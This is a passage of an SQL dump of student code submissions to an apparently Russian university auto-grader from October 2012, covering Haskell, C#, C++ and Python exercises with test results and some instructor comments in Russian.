(2566, 74, '383483', '2012-10-22 17:27:29', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) = \r\n  let \r\n         lres = foldTree f e l\r\n         rres = foldTree f e r\r\n  in f x lres rres\r\nsumPos tr = foldTree (x l r -> if (x>0) then x+l+r else l+r) 0 tr', '<br/>Тесты успешно пройдены!'),
(2567, 65, '442421', '2012-10-22 17:44:21', 1, 'cantor = cantor'' (1,1) False\r\n\r\ncantor'' (a,b) d =  if b==1 && d then [(a,b)] ++ (cantor'' (a-1, b+1) d )\r\n		else if a==1 && d then [(a,b)] ++ (cantor'' (a, b+1) (not d) )\r\n		    else if b==1 && (not d) then [(a,b)] ++ (cantor'' (a+1, b) (not d) )\r\n			else if d then [(a,b)] ++ (cantor'' (a-1, b+1) d ) \r\n			    else [(a,b)] ++ (cantor'' (a+1, b-1) d )\r\n\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(2568, 76, '383483', '2012-10-22 17:51:30', 1, 'class Shape a where perimeter::a->Double\r\n\r\ndata Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\ninstance Shape Circle where\r\n      perimeter (Circle r) = 3.14*2*r\r\ninstance Shape Rect where\r\n      perimeter (Rect x y) = 2*(x+y)', '<br/>Тесты успешно пройдены!'),
(2569, 76, '3431532', '2012-10-22 17:58:10', 1, 'class Shape a where \r\n  perimeter :: a -> Float\r\n\r\ndata Circle = Circle Float\r\ninstance Shape Circle where \r\n  perimeter (Circle x) = 2 * pi * x\r\n\r\ndata Rect = Rect Float Float\r\ninstance Shape Rect where \r\n  perimeter (Rect x y) = 2 * (x + y)\r\n', '<br/>Тесты успешно пройдены!'),
(2570, 68, '383483', '2012-10-22 18:17:48', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _16_1\r\n{\r\n    class Program\r\n    {\r\n        static int[] zeroDigits(int[] a, int n)\r\n        {\r\n      --- ОК, так можно, засчитано.. Но более эффективно, видимо, один раз сосчитать 10^n \r\n      --- и потом на него умножить и разделить\r\n            for (int i=0;i<n;i++)\r\n                a = a.Select(x => x / 10).ToArray();\r\n            for (int i = 0; i < n; i++)\r\n                a = a.Select(x => x * 10).ToArray();\r\n            return a;\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 563, 5643, 76796 };\r\n            int[] b = zeroDigits(a,2);\r\n            for (int i=0;i<b.Length;i++)\r\n                Console.Write("{0} ",b[i]);\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2571, 60, '83813', '2012-10-22 18:25:18', 1, '#include <algorithm>\r\n\r\n#include <vector>\r\n\r\n#include <iostream>\r\n\r\n\r\n\r\nusing std::cerr;\r\n\r\n\r\n\r\ninline void OutVector(const std::vector<int> &v) {\r\n\r\n  for (auto it = v.begin(); it != v.end(); ++it) {\r\n\r\n    if (it != v.begin()) {\r\n\r\n      cerr << ", ";\r\n\r\n    }\r\n\r\n    cerr << *it;\r\n\r\n  }\r\n\r\n  cerr << std::endl;\r\n\r\n}\r\n\r\n\r\n\r\nint main() {\r\n\r\n  std::vector<int> test_vector = {354, 20, 9, 31},\r\n\r\n                   transformed(test_vector.size());\r\n\r\n  OutVector(test_vector);\r\n\r\n  std::transform(test_vector.begin(), test_vector.end(), transformed.begin(),\r\n\r\n      [](int x) -> int {\r\n\r\n        return x % 10;\r\n\r\n      });\r\n\r\n  std::vector<int>::iterator end_of_filtered = std::remove_if(transformed.begin(), transformed.end(),\r\n\r\n      [](int x) -> bool {\r\n\r\n        return x == 0;\r\n\r\n      });\r\n\r\n  transformed.resize(end_of_filtered - transformed.begin());\r\n\r\n  OutVector(transformed);\r\n\r\n\r\n\r\n  return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2572, 60, '3742311', '2012-10-22 18:27:42', 1, '#include "stdafx.h"\r\n#include <iostream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nint lastDigit(int t) {\r\n	return t % 10;\r\n}\r\n\r\nbool isZero(int d)\r\n{\r\n	return d == 0;\r\n}\r\n\r\nvector<int> filter(vector<int> a)\r\n{\r\n	vector<int> b;\r\n\r\n	transform(a.begin(), a.end(), b.begin(), lastDigit);\r\n\r\n	return remove_if(b.begin(), b.end(), isZero);\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	vector<int> a;\r\n	a.push_back(231);\r\n	a.push_back(43120);\r\n	a.push_back(2131);\r\n	a.push_back(310);\r\n	a.push_back(32135);\r\n\r\n	vector<int> b = filter(a);\r\n\r\n	vector<int>::iterator it;\r\n	for (it = b.begin(); it != b.end(); ++it){\r\n		cout << " " << *it;\r\n	}\r\n\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(2573, 68, '51559263', '2012-10-22 18:31:42', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace zeroDigits\r\n{\r\n    class Program\r\n    {\r\n        static string nZeros( int a, int n, int m )\r\n        {\r\n            if (a >= 0 && a.ToString().Length <= n)\r\n            {\r\n                return new string(a.ToString().Select(x => ''0'').ToArray());\r\n            }\r\n\r\n            if (a.ToString().Length <= n + 1)\r\n            {\r\n                return "-" + new string(a.ToString().Substring(1).Select(x => ''0'').ToArray());\r\n            }\r\n\r\n            // без этих двух if работать будет не так, как написано в постановке задачи, т.е\r\n            //                   в случае, когда длина числа <= n, будет выведен один 0, что неверно, так что не понимаю, \r\n            //                   что значит "отнял остаток и всё" - будет неправильно.\r\n                  --- ОК, может вы и правы..\r\n            \r\n            // И ещё, вы как-то всё сразу объясняете, когда просите что-то исправить - мне кажется, что намного интереснее \r\n            // было бы, если в этой задаче, например, вы просто написали бы, ничего не уточняя, что это не эффективно, \r\n            // и надо исправить, ведь у меня тут явная ошибка с циклом была, и я мог бы сам поискать, в чём проблема, \r\n            // и исправить её, а вы всё подробно объяснили, тем самым фактически делая исправление и пересылку задачи \r\n            // абсолютно бессмысленной.) \r\n    --- Да честно сказать Никита, мне совершенно некогда задумываться на тему, как лучше написать ((( У меня каждую\r\n    --- неделю надо примерно 8*25 = 200 задач проверить, это много (((\r\n    --- ОК, если не забуду, вам буду писать короче.\r\n            return (a - (a % m)).ToString();\r\n        }\r\n\r\n        static string[] zeroDigits( int[] a, int n )\r\n        {\r\n            int m = (int)Math.Pow(10, n);\r\n            return a.Select( x => nZeros(x, n, m) ).ToArray();\r\n        }\r\n\r\n        static void Main( )\r\n        {\r\n            int[] arr = { -134, 2, -3222, 4341332, 53, 6876 };\r\n\r\n            foreach ( string str in zeroDigits(arr, 5) )\r\n                Console.Write(str + " ");\r\n\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2574, 79, 'Deutsche', '2012-10-22 19:05:03', 1, '﻿// Задача 19.1 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _19._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static IEnumerable<int> digits(int n1)\r\n\r\n        {\r\n\r\n            int n = n1, ind = 0, rem = 1, memrem, k;\r\n\r\n\r\n\r\n            if (n == 1)\r\n\r\n            {\r\n\r\n                for (int i = 0; ; i++)\r\n\r\n                    yield return 0; // также только дробную часть, целая часть = 1 не выводится\r\n\r\n            }   \r\n\r\n\r\n\r\n            int[] x = new int[2*(n+1)];\r\n\r\n            while (ind != n){\r\n\r\n                x[ind] = (10 * rem) / n;\r\n\r\n                rem = (10 * rem) % n;\r\n\r\n                ind = ind + 1;\r\n\r\n            }\r\n\r\n            memrem = rem;\r\n\r\n            k = 0; // период дроби\r\n\r\n            x[ind] = (10 * rem) / n;\r\n\r\n            rem = (10 * rem) % n;\r\n\r\n            k = k + 1;\r\n\r\n            while (rem != memrem) {\r\n\r\n                x[ind+1] = (10 * rem) / n;\r\n\r\n                rem = (10 * rem) % n;\r\n\r\n                k = k + 1;\r\n\r\n                ind = ind + 1;\r\n\r\n            }\r\n\r\n            for (int i = 0; ; i++)\r\n\r\n            {\r\n\r\n                if (i <= ind)\r\n\r\n                    yield return x[i];\r\n\r\n                else\r\n\r\n                    yield return x[n - 1 + i % (k)];\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int k = 0;\r\n\r\n            int n = 0;\r\n\r\n            Console.Write("Input n: ");\r\n\r\n            n = Convert.ToInt32(Console.ReadLine());\r\n\r\n            Console.WriteLine("First 100 fraction digits (after ''.''): ");\r\n\r\n            foreach (int x in digits(n))\r\n\r\n            {\r\n\r\n                if (k == 99)\r\n\r\n                    Console.Write(x); // чтобы без запятой последнюю цифру\r\n\r\n                else Console.Write(x + ", "); \r\n\r\n                k++;\r\n\r\n                if (k == 100)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2575, 78, '383483', '2012-10-22 19:14:06', 1, 'pascal = [1]: (map (xs -> (zipWith (+) (0:xs) (xs++[0]))) pascal)', '<br/>Тесты успешно пройдены!'),
(2576, 74, 'erwert', '2012-10-22 19:17:31', 2, 'data Tree = Empty | Node Double Tree Tree deriving(Show,Eq)\r\n\r\nfoldTree f r Empty = r\r\nfoldTree f result (Node i l r) =  foldTree f (foldTree f (f result i) l) r\r\n   --- Нет, это не тот вариант foldTree, который называется катаморфизм. Те это не по условию..\r\n\r\nsumPos t = foldTree (x y -> if y >0 then x + y else x) 0 t', '<br/>Тесты успешно пройдены!'),
(2577, 74, 'Deutsche', '2012-10-22 19:22:28', 1, 'data Tree = Empty | Node Double Tree Tree\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) = f x (foldTree f e l) (foldTree f e r)\r\nsumPos t = foldTree (x l r -> if (x>0) then x+l+r else l+r) 0 t', '<br/>Тесты успешно пройдены!'),
(2578, 77, '2562137', '2012-10-22 20:13:14', 1, 'sqrt2 = mysqrt 2\r\n\r\nmysqrt n = [mod x 10 | x <- pows n]\r\n\r\npows n = getNext n 0 0\r\n\r\ngetNext n x p = z : (getNext n z (p + 1)) where\r\n	z = maximum (filter (y -> y ^ 2 <= n * 10 ^ (2 * p)) [x * 10 + d | d <- [0..9]])\r\n', '<br/>Тесты успешно пройдены!'),
(2579, 79, '472848', '2012-10-22 20:13:25', 1, 'private static IEnumerable<int> digits(int n)\r\n{\r\n  int n0 = 1;\r\n  while (true)\r\n  {\r\n    int i = n0 / n;\r\n    n0 = 10 * (n0 % n);\r\n    yield return i; \r\n  }\r\n}\r\n\r\npublic static void Main(string[] args)\r\n{\r\n  Console.WriteLine("Введите число:");\r\n  int val;\r\n  while (!int.TryParse(Console.ReadLine(), out val)) ;\r\n  int i = 0;\r\n  foreach (int d in digits(val)) { Console.Write("{0} ", d); if (++i == 100) break; }\r\n  Console.WriteLine();\r\n}', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2580, 65, '51559263', '2012-10-22 20:19:16', 1, 'cantor = [ (x, y) | n <- [1..], i <- [1..2*n-1], let x | i <= n = i\r\n\r\n                                                       | i > n = n, \r\n\r\n                                                 let y | i <= n = n\r\n\r\n                                                       | i > n = i - n ]\r\n', '<br/>Тесты успешно пройдены!'),
(2581, 80, '472848', '2012-10-22 20:26:38', 1, 'class Pair<T, K>\r\n{\r\n  public T First { get; set; }\r\n  public K Second { get; set; }\r\n  public Pair(T first, K second)\r\n  {\r\n    First = first;\r\n    Second = second;\r\n  }\r\n}\r\n\r\nprivate static IEnumerable<Pair<int, int>> cantor()\r\n{\r\n  for (int n = 1; ; ++n)\r\n  {\r\n    for (int i = 1; i < n; ++i)\r\n    {\r\n      yield return new Pair<int, int>(i, n - i);\r\n    }\r\n  }\r\n}\r\n\r\npublic static void Main(string[] args)\r\n{\r\n  int i = 0;\r\n  foreach (var p in cantor())\r\n  {\r\n    Console.Write("({0}, {1}) ", p.First, p.Second);\r\n    if (++i == 100) break;\r\n  }\r\n  Console.WriteLine();\r\n}', '<br/>Тесты успешно пройдены!'),
(2582, 79, '2562137', '2012-10-22 20:32:23', 1, 'def digits(n):\r\n	i = 10 # skip zero iteration\r\n	while True:\r\n		yield i / n\r\n		i %= n\r\n		i *= 10\r\n\r\n\r\nn = int(raw_input("Enter n: "))\r\ni = 0\r\nfor d in digits(n):\r\n	i += 1\r\n	if i == 100:\r\n		break\r\n	print d,\r\n', '<br/>Тесты успешно пройдены!'),
(2583, 80, '2562137', '2012-10-22 20:36:36', 1, 'def countfrom(n):\r\n	n = 1\r\n	while True:\r\n		yield n\r\n		n += 1\r\n\r\ndef getpairs(sum):\r\n	for i in countfrom(1):\r\n		if i == sum:\r\n			break\r\n		yield (i, sum-i)\r\n\r\ndef cantor():\r\n	for sum in countfrom(1):\r\n		for pair in getpairs(sum):\r\n			yield pair\r\n\r\n\r\nn = int(raw_input("Enter limit: "))\r\ni = 0\r\nfor p in cantor():\r\n	i += 1\r\n	if i == n:\r\n		break\r\n	print p,\r\n', '<br/>Тесты успешно пройдены!'),
(2584, 67, '51559263', '2012-10-22 22:20:49', 0, '#include <stdio.h>\r\n#include <algorithm>\r\n#include <string>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nvoid zeroDigits( int* pA, int size, unsigned int n )\r\n{\r\n	int power = pow( 10.0, (int)n );\r\n	transform( pA, pA + size, pA, [n, power](int a){ return a - a % power; } );\r\n\r\n	int* pB = pA;\r\n	while ( pB != pA + size )\r\n		cout << *(pB++) << " " ;\r\n}\r\n\r\nvoid main()\r\n{\r\n	int a[] = { 101, -200, 345, 45530, -5 };\r\n\r\n	zeroDigits( a, 5, 2 );\r\n\r\n	char c;\r\n	cin >> c;\r\n}', '<br/>Тесты успешно пройдены!'),
(2585, 67, '51559263', '2012-10-22 22:22:24', 1, '#include <stdio.h>\r\n#include <algorithm>\r\n#include <string>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nvoid zeroDigits( int* pA, int size, unsigned int n )\r\n{\r\n	int power = pow( 10.0, (int)n );\r\n	transform( pA, pA + size, pA, [power](int a){ return a - a % power; } );\r\n\r\n	int* pB = pA;\r\n	while ( pB != pA + size )\r\n		cout << *(pB++) << " " ;\r\n}\r\n\r\nvoid main()\r\n{\r\n	int a[] = { 101, -200, 345, 45530, -5 };\r\n\r\n	zeroDigits( a, 5, 2 );\r\n\r\n	char c;\r\n	cin >> c;\r\n}', '<br/>Тесты успешно пройдены!'),
(2586, 80, '3431532', '2012-10-23 06:11:06', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            foreach(List<int> lst in pairs())\r\n            {\r\n                Console.WriteLine(String.Format("({0}, {1})", lst.ElementAt(0), lst.ElementAt(1)));\r\n                if (lst.ElementAt(0) > 3)\r\n                    return;\r\n            }\r\n        }\r\n\r\n        static IEnumerable<List<int>> pairs()\r\n        {\r\n            int i = 1;\r\n            while (true)\r\n            {\r\n\r\n                for(int i1=1;i1<=i;i1++)\r\n                {\r\n                    List<int> lst = new List<int>();\r\n         --- Можно кстати тут сразу написать List<int> lst = new List<int>() { i1, i2 };\r\n                    lst.Add(i1);\r\n                    lst.Add(i);\r\n                    yield return lst;          \r\n                }\r\n                for (int i1 = 1; i1 < i; i1++)\r\n                {\r\n                    List<int> lst = new List<int>();\r\n                    lst.Add(i);\r\n                    lst.Add(i1);\r\n                    yield return lst;\r\n                }\r\n\r\n                i++;\r\n            }\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2587, 66, '3431532', '2012-10-23 10:27:51', 0, 'generalizedCantor n = rmDub (concat [cantorr n x | x <- [1..100]])\r\n\r\ncantorr 0 nx = [[]]\r\ncantorr n nx = [x:y |x<-[nx..nx+1], y <- cantorr (n-1) nx]\r\n\r\n\r\nrmDub (x:y:xs) | x == y = rmDub (y:xs)\r\nrmDub (x:y:xs) = x : rmDub (y:xs)\r\nrmDub x | length x < 3 = x\r\n', 'Выражение имеет неправильное значение: length(filter(==[6,3])(take 100 (generalizedCantor 2)))'),
(2588, 66, '3431532', '2012-10-23 10:51:42', 1, 'generalizedCantor n = rmDub (concat [cantorr n x | x <- [1..]])\r\n\r\ncantorr 0 nx = [[]]\r\ncantorr n nx = [x:y |x<-[1..nx], y <- cantorr (n-1) nx]\r\n\r\n\r\nrmDub (x:xs) = x : rmDub (deletee x xs)\r\nrmDub x | length x < 2 = x\r\n\r\ndeletee x (y:xs) | x == y = deletee x xs\r\ndeletee x [] = []\r\ndeletee x (y:xs) = y : (deletee x xs)\r\n', '<br/>Тесты успешно пройдены!'),
(2589, 67, 'jogrms', '2012-10-23 11:10:33', 1, '#include <iostream>\r\n#include <algorithm>\r\n#include <cmath>\r\n\r\nvoid zeroDigits(int* a, size_t size, int n) {\r\n    int div = (int) pow(10, n);\r\n    std::transform(a, a + size, a, [div](int i){ return i / div * div; });\r\n}\r\n\r\nint main() {\r\n    int a[] = {563, 5643, 76796};\r\n    zeroDigits(a, 3, 2);\r\n\r\n    std::for_each(a, a + 3, [](int i){ std::cout << i << " "; });\r\n    std::cout << std::endl;\r\n\r\n    return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2590, 68, 'jogrms', '2012-10-23 11:17:59', 1, 'using System;\r\nusing System.Linq;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static int[] zeroDigits(int[] a, int n)\r\n        {\r\n            int div = (int) Math.Pow(10, n);\r\n            return a.Select(x => x / div * div).ToArray();\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 563, 5643, 76796 };\r\n            int[] b = zeroDigits(a, 2);\r\n            foreach (int i in b)\r\n            {\r\n                System.Console.WriteLine(i);\r\n            }\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2591, 69, 'jogrms', '2012-10-23 11:37:32', 1, 'bigSin n = head $ dropWhile (< n) $ map sin [1..]', '<br/>Тесты успешно пройдены!'),
(2592, 70, 'jogrms', '2012-10-23 11:44:36', 1, 'myFilter :: (a -> Bool) -> [a] -> [a]\r\nmyFilter f = foldr (x acc -> if f x then x:acc else acc) []\r\n', '<br/>Тесты успешно пройдены!'),
(2593, 71, 'jogrms', '2012-10-23 11:50:50', 0, 'approxSum = sum . takeWhile (>=0.000001)\r\n\r\nz = approxSum $ map (x -> 1 / x^2) [1..]', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2594, 71, 'jogrms', '2012-10-23 11:54:09', 1, 'approxSum = sum . takeWhile ((>=0.000001) . abs)\r\n\r\nz = approxSum $ map (x -> 1 / x^2) [1..]\r\n', '<br/>Тесты успешно пройдены!'),
(2595, 72, 'jogrms', '2012-10-23 12:05:35', 1, 'weekendExpences = foldl (acc (i,x) -> acc + i * x) 0 . zip (cycle [0,0,0,0,0,1,1])\r\n  --- ОК, но проще было бы, наверное, воспользоватся zipWith (*)', '<br/>Тесты успешно пройдены!'),
(2596, 74, '3607492', '2012-10-23 12:48:17', 1, 'data Tree a = Node a (Tree a) (Tree a) | Empty\r\n\r\nfoldTree::(a->a->a->a,a)->a->Tree a->a\r\nfoldTree (f,g) el Empty = g\r\nfoldTree (f,g) el (Node d (x) (y)) = f d (foldTree (f,g) el x) (foldTree (f,g) el y)\r\n\r\n\r\nsumPos a = (foldTree ((e x y->if (e>=0 && x>=0) then (e+x+y) else if (x>=0) then (x+y) else if (e>=0) then (e+y) else y),0) 0 a)\r\n   --- OK) Но на самом деле x и y проверять совершенно не надо - это ведь _суммы_, посчитанные для поддеревьев\r\n   --- и их совершенно не надо проверять на > 0/ Проверять надо толькл элемнтв\r\n   --- те можно e x y->if e>=0 then e+x+y else x + y  и все\r\n ', '<br/>Тесты успешно пройдены!'),
(2597, 73, 'jogrms', '2012-10-23 14:38:09', 0, 'fib = 1:1:zipWith (+) fib (tail fib)', 'Не удалось вычислить выражение "take 10 fibs", проверьте правильность синтаксиса'),
(2598, 73, 'jogrms', '2012-10-23 14:38:55', 1, 'fibs = 1:1:zipWith (+) fibs (tail fibs)', '<br/>Тесты успешно пройдены!'),
(2599, 77, '12206137', '2012-10-23 14:42:36', 1, 'import Data.Bits\r\n\r\n\r\n\r\ndigits :: Integer -> Integer -> [Integer]\r\n\r\ndigits curDiv rem =\r\n\r\n    let\r\n\r\n        findDigit l r =\r\n\r\n            if r <= l+1 then l\r\n\r\n            else\r\n\r\n                let mid = shiftR (l+r) 1 in\r\n\r\n                if (curDiv + mid) * mid > rem then findDigit l mid\r\n\r\n                else findDigit mid r\r\n\r\n    in\r\n\r\n    let\r\n\r\n        digit = findDigit 0 10\r\n\r\n        divider = curDiv + digit\r\n\r\n        newRem = (rem - divider*digit) * 100\r\n\r\n        newDiv = (divider + digit) * 10\r\n\r\n    in\r\n\r\n    digit:(digits newDiv newRem)\r\n\r\n\r\n\r\nsqrt2 = digits 0 2\r\n', '<br/>Тесты успешно пройдены!'),
(2600, 77, '318210', '2012-10-23 15:28:47', 1, 'func n x beg | (x * 10 + beg) * (x * 10 + beg) > n = beg - 1\r\n	     | otherwise = func n x (beg + 1)\r\n\r\nfunc1 n curr = (func n curr 1) : (func1 (n * 100) (curr * 10 + ( func n curr 1) ) )\r\n\r\nsqrt2 = func1 2 0\r\n', '<br/>Тесты успешно пройдены!'),
(2601, 76, 'jogrms', '2012-10-23 15:37:31', 1, 'class Shape a where\r\n    perimeter :: a -> Float\r\n\r\ndata Circle = Circle Float\r\ndata Rect = Rect Float Float\r\n\r\ninstance Shape Circle where\r\n    perimeter (Circle r) = 2 * pi * r\r\n\r\ninstance Shape Rect where\r\n    perimeter (Rect a b) = 2 * (a + b)\r\n', '<br/>Тесты успешно пройдены!'),
(2602, 78, '12206137', '2012-10-23 15:49:26', 1, 'pascal :: [[Int]]\r\n\r\npascal = [1]:(zipWith (zipWith (+)) (map (0 :) pascal) (map (++ [0]) pascal))\r\n', '<br/>Тесты успешно пройдены!'),
(2603, 76, '2562137', '2012-10-23 16:53:14', 1, 'data Rect = Rect Double Double\r\ndata Circle = Circle Double\r\n\r\nclass Shape a where\r\n	area :: a -> Double\r\n	perimeter :: a -> Double\r\n	contains :: a -> Double -> Double -> Bool\r\n\r\ninstance Shape Rect where\r\n	area (Rect x y) = x * y\r\n	perimeter (Rect x y) = 2 * (x + y)\r\n\r\ninstance Shape Circle where\r\n	area (Circle r) = 3.1415926 * r * r\r\n	perimeter (Circle r) = 2 * 3.1415926 * r', '<br/>Тесты успешно пройдены!'),
(2604, 80, '3607492', '2012-10-23 17:10:49', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<Tuple<int,int>> cantor()\r\n        {\r\n            for (int i = 1, j=1; ; )\r\n            {\r\n               yield return new Tuple<int,int>(i,j);\r\n                if (i>j){\r\n                    yield return new Tuple<int,int>(j,i);\r\n                    j++;\r\n                }\r\n                else{\r\n                    i++;\r\n                    j=1;\r\n                }\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int a = 0;\r\n            foreach (Tuple<int,int> t in cantor())\r\n            {\r\n                if (a >= 100) break;\r\n                Console.WriteLine("({0},{1})  ",t.Item1,t.Item2);\r\n                a++;\r\n            }\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2605, 74, '2562137', '2012-10-23 17:31:05', 1, 'data Tree = Empty | Node Int Tree Tree\r\n\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) =\r\n	let \r\n		lres = foldTree f e l\r\n		rres = foldTree f e r\r\n	in f x lres rres\r\n\r\nsumPos = foldTree (x l r -> (max x 0) + l + r) 0', '<br/>Тесты успешно пройдены!'),
(2606, 80, 'Deutsche', '2012-10-23 17:59:56', 0, '// Задача 19.2 Чистяков П.П. 543 гр.\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _19._2\r\n{\r\n    class Program\r\n    {\r\n        // разбор по диагоналям\r\n        public static IEnumerable<Tuple<int, int>> pairs()\r\n        {\r\n            for (int n = 2; ; n++)\r\n                for (int i = 1; i < n; i++)\r\n                    yield return new Tuple<int, int>(i, n - i);\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Console.WriteLine("First 100 pairs: ");\r\n            int k = 0;\r\n            foreach (Tuple<int, int> x in pairs())\r\n            {\r\n                if (k == 99)\r\n                    Console.Write(x);\r\n                else Console.Write(x + ", ");\r\n                k++;\r\n                if (k == 100)\r\n                    break;\r\n            }\r\n            Console.WriteLine();\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2607, 80, 'Deutsche', '2012-10-23 18:00:47', 1, '﻿// Задача 19.2 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _19._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        // разбор по диагоналям\r\n\r\n        public static IEnumerable<Tuple<int, int>> pairs()\r\n\r\n        {\r\n\r\n            for (int n = 2; ; n++)\r\n\r\n                for (int i = 1; i < n; i++)\r\n\r\n                    yield return new Tuple<int, int>(i, n - i);\r\n\r\n        }\r\n\r\n\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Console.WriteLine("First 100 pairs: ");\r\n\r\n            int k = 0;\r\n\r\n            foreach (Tuple<int, int> x in pairs())\r\n\r\n            {\r\n\r\n                if (k == 99)\r\n\r\n                    Console.Write(x);\r\n\r\n                else Console.Write(x + ", ");\r\n\r\n                k++;\r\n\r\n                if (k == 100)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2608, 74, '12206137', '2012-10-23 18:22:41', 1, 'data Tree = Empty | Node Int Tree Tree\r\n  --- А зачем вы так сложно написали, мне что-то не сообразить?\r\n\r\n\r\nfoldTree merge emptyVal =\r\n\r\n    let\r\n\r\n        fold fun Empty = fun emptyVal\r\n\r\n        fold fun (Node val left right) =\r\n\r\n            fold (left -> fold (\r\night -> fun (merge left right val)) right) left\r\n\r\n    in\r\n\r\n    fold id\r\n\r\n\r\n\r\nsumPos = foldTree (l r v -> l+r+ (if (v > 0) then v else 0)) 0\r\n', '<br/>Тесты успешно пройдены!'),
(2609, 69, '1705225', '2012-10-23 18:40:11', 0, 'bigSin x = head $ filter (>x) (map(sin) [1..])', '<br/>Тесты успешно пройдены!'),
(2610, 69, '1705225', '2012-10-23 18:54:58', 0, 'bigSin x = head . filter (>=x) $ map(sin) [1..]', '<br/>Тесты успешно пройдены!'),
(2611, 69, '1705225', '2012-10-23 19:04:49', 1, 'bigSin x \r\n	| x >  1 	= error "Sin cannot be bigger then  1"\r\n	| x < -1 	= error "Sin cannot be lesser then -1"\r\n	| otherwise = head . filter (>=x) $ map(sin) [1..]', '<br/>Тесты успешно пройдены!'),
(2612, 70, '1705225', '2012-10-23 19:30:28', 1, 'myFilter p xs = foldr (x acc -> if p x then x:acc else acc) [] xs', '<br/>Тесты успешно пройдены!'),
(2613, 69, '239817', '2012-10-23 19:42:09', 1, 'import Data.List (find)\r\nimport Data.Maybe (fromJust)\r\n\r\nbigSin x = \r\n        if x <= 1\r\n        then fromJust (find ((<=) x) [sin n | n <- [1..]]) \r\n        else -1\r\n', '<br/>Тесты успешно пройдены!'),
(2614, 71, '1705225', '2012-10-23 19:55:18', 1, 'approxSum = sum . takeWhile (x -> abs x > 0.000001)\r\nlist'' = map (x -> 1/x^2) [1..]\r\n\r\nz = approxSum list''', '<br/>Тесты успешно пройдены!'),
(2615, 72, '1705225', '2012-10-23 20:14:48', 1, 'weekendExpences = sum . zipWith (a b -> if a > 5 then b else 0) list'' \r\n					where list'' = cycle [1..7]', '<br/>Тесты успешно пройдены!'),
(2616, 73, '1705225', '2012-10-23 20:27:21', 1, 'fibs = 1:1:(zipWith (+) fibs $ tail fibs)', '<br/>Тесты успешно пройдены!'),
